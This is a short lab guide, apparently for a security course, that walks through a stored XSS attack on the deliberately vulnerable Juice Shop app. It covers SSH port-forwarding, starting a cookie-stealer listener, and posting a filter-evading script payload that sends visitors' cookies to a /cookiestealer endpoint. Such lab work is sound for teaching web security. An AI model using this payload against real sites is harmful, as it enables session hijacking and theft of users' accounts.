# XSS Guide

## Set up:

1. Connect to kaliVM and forward the Juice shop to your localhost:

	```ssh -i <PATH_TO_SSH_KEY> -L <ONE_PORT_OF_GIVEN_PORTS>:<KALI_VM_LOCAL_IP>:3000 <USER_NAME>@130.238.10.236```
2. Start the *3rd_party_cookie_stealer.py* program:

	```python3 3rd_party_cookie_stealer.py```
3. Post the following comment in the section *contact us*:

	```<<script> foo</script>document.write(' <img src="http://localhost:3000/cookiestealer /> ');</script>script>```	

On the terminal running *3rd_party_cookie_stealer.py* the cookies should be printed
